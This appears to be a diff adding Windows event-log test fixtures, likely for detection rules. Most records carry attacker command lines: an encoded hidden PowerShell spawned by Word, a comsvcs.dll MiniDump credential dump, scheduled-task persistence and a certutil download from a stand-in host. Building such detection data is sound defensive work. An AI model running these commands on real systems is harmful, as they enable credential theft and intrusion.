@@ -1,0 +1,7 @@
+{"category":"process_creation","Image":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad.exe notes.txt","ParentImage":"C:\\Windows\\explorer.exe"}
+{"category":"process_creation","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A","ParentImage":"C:\\Program Files\\Microsoft Office\\winword.exe"}
+{"category":"process_creation","Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
+{"category":"process_creation","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr C:\\Users\\bob\\AppData\\Roaming\\u.exe /sc daily","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
+{"category":"process_creation","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://evil.example/p.exe p.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe"}
+{"category":"network_connection","SourceIp":"203.0.113.50","DestinationPort":3389}
+{"category":"network_connection","SourceIp":"10.1.2.3","DestinationPort":3389}
